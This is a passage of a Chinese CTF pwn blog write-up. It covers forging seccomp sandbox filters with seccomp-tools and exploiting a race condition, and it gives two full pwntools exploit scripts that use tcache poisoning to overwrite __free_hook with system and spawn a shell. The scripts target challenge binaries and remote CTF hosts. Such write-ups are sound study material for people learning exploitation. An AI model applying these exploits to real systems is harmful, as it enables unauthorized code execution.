+<h4 id="2、我们构造的沙箱规则其实就是覆盖sock-filter来实现，这里通过一个vip的题目介绍一个书写沙箱规则的神器seccomp-tools-https-github-com-david942j-seccomp-tools-gt"><a href="#2、我们构造的沙箱规则其实就是覆盖sock-filter来实现，这里通过一个vip的题目介绍一个书写沙箱规则的神器seccomp-tools-https-github-com-david942j-seccomp-tools-gt" class="headerlink" title="2、我们构造的沙箱规则其实就是覆盖sock_filter来实现，这里通过一个vip的题目介绍一个书写沙箱规则的神器seccomp-tools (https://github.com/david942j/seccomp-tools&gt;)"></a>2、我们构造的沙箱规则其实就是覆盖sock_filter来实现，这里通过一个vip的题目介绍一个书写沙箱规则的神器seccomp-tools (<a href="https://github.com/david942j/seccomp-tools&gt;" target="_blank" rel="noopener">https://github.com/david942j/seccomp-tools&gt;</a>)</h4><p>先来看下程序：看库可以知道是2.27的，tcache攻击即可。</p>
+<p><img src="/blog_img/1568476080854.png" alt="56847608085"></p>
+<p>保护很一般，看下ida：</p>
+<p><img src="/blog_img/1568476256912.png" alt="56847625691"></p>
+<p>常规菜单题，这里malloc是固定大小0x50，然后可以申请15个堆块，正常的free和puts和exit，但是edit这里有东西：</p>
+<p><img src="/blog_img/1568476490527.png" alt="56847649052"></p>
+<p>可以看到content中有任意大小泄露</p>
+<p><img src="/blog_img/1568476342218.png" alt="56847634221"></p>
+<p>这是read我们的content到堆块中，但是很明显0x4040E0是0，而且不太可能改变这个值，这样就会导致随机数的写入，为了实现任意大小写入，我们需要让fd返回0，也就是说禁用open函数，让它返回0，从而达到目的。</p>
+<p>我们来看下vip有什么玄机：</p>
+<p><img src="/blog_img/1568476679309.png" alt="56847667930"></p>
+<p>这里看到有prctl函数，又看到了seccomp函数，很明显是禁用了某些函数， 同时有沙箱规则在里面，而且v1指针指向的正是我们的sock_filter结构体，通过read到buf中的数据，我们可以覆盖结构体的内容(只能覆盖0x30空间)，实现沙箱规则的伪造，下面正式开始介绍工具：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//首先看下dump（查看seccomp保护下的情况），使用命令：</span></span><br><span class="line">seccomp-tools  dump  ./文件名</span><br></pre></td></tr></table></figure>
+
+<p><img src="/blog_img/1568475874453.png" alt="56847587445"></p>
+<p>看程序禁用的可以知道，它只允许write、read、open、exit函数，以结构体的形式展示</p>
+<p>也可以用字符的形式展示：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./文件名 -f inspect</span><br></pre></td></tr></table></figure>
+
+<p><img src="/blog_img/1568477327941.png" alt="56847732794"></p>
+<p>下面构造沙箱规则：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">A = sys_number</span><br><span class="line">A==openat ? next:ok</span><br><span class="line">A=args[<span class="number">1</span>]</span><br><span class="line">A==<span class="number">0x40207e</span> ? next:ok</span><br><span class="line"><span class="keyword">return</span> ERRNO(<span class="number">0</span>)</span><br><span class="line">ok:</span><br><span class="line"><span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将规则转成字符形式</span></span><br><span class="line">seccomp-tools <span class="keyword">asm</span> 文件名.<span class="keyword">asm</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/blog_img/1568478755624.png" alt="56847875562"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//转成汇编代码</span></span><br><span class="line">seccomp-tools <span class="keyword">asm</span> 文件名.<span class="keyword">asm</span> -f assembly</span><br></pre></td></tr></table></figure>
+
+<p><img src="/blog_img/1568478976520.png" alt="56847897652"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//转成C语言代码</span></span><br><span class="line">seccomp-tools <span class="keyword">asm</span> <span class="number">44.</span><span class="keyword">asm</span> -f c_source</span><br></pre></td></tr></table></figure>
+
+<p><img src="/blog_img/1568479060956.png" alt="56847906095"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将规则转成结构体形式</span></span><br><span class="line">seccomp-tools <span class="keyword">asm</span> 文件名.<span class="keyword">asm</span> -f raw | seccomp-tools disasm -</span><br></pre></td></tr></table></figure>
+
+<p><img src="/blog_img/1568478904947.png" alt="56847890494"></p>
+<p>当然还有disasm和emu功能~自己去探索吧</p>
+<p>有个规则，写入即可，接着我们就可以任意溢出了，这里overlap创造出unsorted bin，泄露出真实地址，这里直接修改FD为free_hook，直接打system即可getshell</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./vip'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./vip'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'112.126.103.14'</span>,<span class="number">9999</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice: "</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">"Index: "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">"Size: "</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">"Content: "</span>)</span><br><span class="line">    sd(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice: "</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"Index: "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice: "</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"Index: "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice: "</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">"Index: "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vip</span><span class="params">(py)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice: "</span>)</span><br><span class="line">    sl(<span class="string">'6'</span>)</span><br><span class="line">    ru(<span class="string">"OK, but before you become vip, please tell us your name: "</span>)</span><br><span class="line">    sd(py)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">    malloc(i)</span><br><span class="line">py = <span class="string">'a'</span>*<span class="number">0x20</span> + <span class="string">" \x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x03\x01\x01\x00\x00 \x00\x00\x00\x18\x00\x00\x00\x15\x00\x00\x01~ @\x00\x06\x00\x00\x00\x00\x00\x05\x00\x06\x00\x00\x00\x00\x00\xFF\x7F"</span></span><br><span class="line">vip(py)</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">0x50</span></span><br><span class="line">py += p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x60</span>, py)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">malloc(<span class="number">12</span>)</span><br><span class="line">puts(<span class="number">12</span>)</span><br><span class="line">malloc_hook = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) <span class="number">-1104</span> <span class="number">-0x10</span></span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">onegadget = libc_base + <span class="number">0x10a38c</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"malloc_hook---&gt;"</span> + hex(malloc_hook)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">0x50</span></span><br><span class="line">py += p64(<span class="number">0</span>) + p64(<span class="number">61</span>)</span><br><span class="line">py += p64(free_hook)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x70</span>,py)</span><br><span class="line">malloc(<span class="number">13</span>)</span><br><span class="line">malloc(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>, <span class="number">0x20</span>, p64(system))</span><br><span class="line">edit(<span class="number">7</span>,<span class="number">0x20</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="三、竞争条件"><a href="#三、竞争条件" class="headerlink" title="三、竞争条件"></a>三、竞争条件</h3><h4 id="1、概念前言"><a href="#1、概念前言" class="headerlink" title="1、概念前言"></a>1、概念前言</h4><p>​        这里打CTF第一次遇到这种题目，也积累下知识和经验，首先理解下条件竞争的含义和概念。竞争条件是系统中的一种反常现象，由于现代Linux系统中大量使用并发编程，对资源进行共享，如果产生错误的访问模式，便可能产生内存泄露，系统崩溃，数据破坏，甚至安全问题。竞争条件漏洞就是多个进程访问同一资源时产生的时间或者序列的冲突，并利用这个冲突来对系统进行攻击。一个看起来无害的程序如果被恶意攻击者利用，将发生竞争条件漏洞。</p>
+<h4 id="2、理解和加深"><a href="#2、理解和加深" class="headerlink" title="2、理解和加深"></a>2、理解和加深</h4><p>纸上谈来终觉浅，我们用代码和图像来直接理解：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">1</span>;  </span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mythread1</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">1</span>)&#123;                 &lt;a&gt;</span><br><span class="line">    　　sleep(<span class="number">3</span>);</span><br><span class="line">    　　<span class="keyword">if</span>(i == <span class="number">2</span>)              &lt;b&gt;</span><br><span class="line">        　　<span class="built_in">printf</span>(<span class="string">"hack it!\n"</span>);</span><br><span class="line">    </span><br><span class="line">    　　<span class="keyword">else</span></span><br><span class="line">        　　<span class="built_in">printf</span>(<span class="string">"try again!\n"</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mythread2</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    i=<span class="number">2</span>;      </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span>  </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">pthread_t</span> id1,id2;  </span><br><span class="line">  </span><br><span class="line">    pthread_create(&amp;id1, <span class="literal">NULL</span>, (<span class="keyword">void</span> *)mythread1,<span class="literal">NULL</span>);  </span><br><span class="line">    pthread_create(&amp;id2, <span class="literal">NULL</span>, (<span class="keyword">void</span> *)mythread2,<span class="literal">NULL</span>);  </span><br><span class="line">     </span><br><span class="line">    pthread_join(id1,<span class="literal">NULL</span>);  </span><br><span class="line">    pthread_join(id2,<span class="literal">NULL</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序逻辑很简单，创建2个线程，然后第一个睡了3s后再继续执行，第二个睡了1s就继续执行，这里就是很明显的竞争条件，id2会趁着id1睡着时去改i的数据，这样就会回显出hack it(正常不发生竞争条件的话，是回显try again)。不理解的话，我们再用图像来解释：</p>
+<p><img src="/blog_img/1568265078055.png" alt="56826507805"></p>
+<p>理解完了什么是条件竞争，在CTF的比赛中，pwn方向也会出现这样的题目，这里就实战总结下。</p>
+<h4 id="3、实战总结"><a href="#3、实战总结" class="headerlink" title="3、实战总结"></a>3、实战总结</h4><p>题目：强网杯pwn1</p>
+<p><img src="/blog_img/1568265605404.png" alt="56826560540"></p>
+<p>保护全开，然后给了个2.27的库（tcache攻击），直接分析ida：</p>
+<p><img src="/blog_img/1568265678065.png" alt="56826567806"></p>
+<p>熟悉的菜单题，3个功能，下面一个个分析：</p>
+<p>1、malloc</p>
+<p><img src="/blog_img/1568266324165.png" alt="56826632416"></p>
+<p>正常的申请，idx下标没有检查，意味着有负数的机会(一个漏洞点)，申请的堆块是0xA0的固定大小，内容也是申请的0xA0的大小，内容就在堆块本身，所以chunk的结构就出来了：</p>
+<p>struct chunk{</p>
+<p>   int size；</p>
+<p>   string string；</p>
+<p>}</p>
+<p>再看看free函数：</p>
+<p><img src="/blog_img/1568266490494.png" alt="56826649049"></p>
+<p>这里对idx进行了检查，同时没有UAF的漏洞（null置为了0）</p>
+<p>最后看下神秘的run函数：</p>
+<p><img src="/blog_img/1568266540244.png" alt="56826654024"></p>
+<p>看到了线程创建，猜想有可能是竞争条件或者TLS攻击的栈溢出，进去看看</p>
+<p><img src="/blog_img/1568266583667.png" alt="56826658366"></p>
+<p>功能就是输入key作为堆块内容异或加密的值，然后输出异或加密的内容，主要注意到sleep(3)，这是一个很明显的提示（竞争条件）意味着run函数执行到一半，sleep了，然后后面的函数会先执行，之后再回来执行睡醒的run函数，写个代码理解下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">malloc(0,&#39;AAAAAAAA&#39;) 1</span><br><span class="line">run(0,key) 3</span><br><span class="line">free(0) 2</span><br></pre></td></tr></table></figure>
+
+<p>很清晰可以看到执行顺序为1,3,2。知道了这个漏洞接下来的事情就好办了，思路马上有了：</p>
+<p>1、先泄露出真实地址(异或0得到本身），因为申请的堆块刚好是unsortd bin 大小</p>
+<p>2、利用条件竞争先free再在FD中伪造fake_chunk为free_hook</p>
+<p>3、申请2次，改free_hook为system，free掉一个有/bin/sh\x00的堆块既可getshell</p>
+<p>上exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn1'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./pwn1'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(index,content,flag=<span class="number">1</span>)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> flag:</span><br><span class="line">		ru(<span class="string">"3.run"</span>)</span><br><span class="line">	sl(<span class="string">'1'</span>)</span><br><span class="line">	ru(<span class="string">"index:"</span>)</span><br><span class="line">	sl(str(index))</span><br><span class="line">	ru(<span class="string">"content:"</span>)</span><br><span class="line">	sd(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"3.run"</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">"index:"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(index,key)</span>:</span></span><br><span class="line">    ru(<span class="string">"3.run"</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"index:"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">"input key:"</span>)</span><br><span class="line">    sl(str(key))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    malloc(i,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	free(i)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(k,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">malloc(<span class="number">10</span>,<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">fun(<span class="number">10</span>,<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">"aaaaaaaa"</span>)</span><br><span class="line">malloc_hook = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"malloc--&gt;"</span> + hex(malloc_hook)</span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">ru(<span class="string">"done"</span>)</span><br><span class="line">sl(<span class="string">'2'</span>)</span><br><span class="line">ru(<span class="string">"index:"</span>)</span><br><span class="line">sl(<span class="string">'8'</span>)</span><br><span class="line">malloc(<span class="number">11</span>,<span class="string">'\x00'</span>*<span class="number">8</span>)</span><br><span class="line">fun(<span class="number">11</span>,free_hook)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">ru(<span class="string">'done'</span>)</span><br><span class="line"><span class="comment">#接收到done表示3s过去了，run执行完了</span></span><br><span class="line">malloc(<span class="number">11</span>,<span class="string">'/bin/sh\x00'</span>,<span class="number">0</span>)</span><br><span class="line">malloc(<span class="number">12</span>,p64(system))</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/blog_img/1568267051387.png" alt="56826705138"></p>
+<h3 id="四、IO-File结构体与攻击方法"><a href="#四、IO-File结构体与攻击方法" class="headerlink" title="四、IO_File结构体与攻击方法"></a>四、IO_File结构体与攻击方法</h3><p>(待更新…….)</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/chengdu.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
+                    <p>V1ct0r</p>
+                    <span>Where there is a will,there is a way！</span>
+                    <dl>
+                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">62 <p>Articles</p></a></li>
+                    <li><a href="/categories">7 <p>Categories</p></a></li>
+                    <li><a href="/tags">59 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>Contents</h4>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、Tcache攻击"><span class="toc-number">1.</span> <span class="toc-text">一、Tcache攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、-沙箱规则"><span class="toc-number">2.</span> <span class="toc-text">二、 沙箱规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、竞争条件"><span class="toc-number">3.</span> <span class="toc-text">三、竞争条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四、IO-File结构体与攻击方法"><span class="toc-number">4.</span> <span class="toc-text">四、IO_File结构体与攻击方法</span></a></li></ol>
